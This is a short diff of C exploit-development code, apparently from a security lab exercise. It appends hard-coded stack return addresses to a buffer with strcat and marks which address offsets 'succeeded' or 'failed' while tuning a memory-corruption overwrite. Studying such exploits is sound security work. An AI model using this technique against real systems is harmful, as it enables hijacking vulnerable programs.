@@ -28,12 +28,17 @@ int main(void)
   	// strcat(str, "\x2c\xfb\xff\xbf");
   	// strcat(str, "\x20\xfb\xff\xbf");
 
+    // success
     // - 151
   	strcat(str, "\x6f\xfb\xff\xbf");
+    // - 150
+  	// strcat(str, "\x70\xfb\xff\xbf");
+
+    // failed
     // - 153
-  	strcat(str, "\x6d\xfb\xff\xbf");
+  	// strcat(str, "\x6d\xfb\xff\xbf");
     // - 154
-  	strcat(str, "\x6c\xfb\xff\xbf");
+  	// strcat(str, "\x6c\xfb\xff\xbf");
 
 
     // bffffbd4
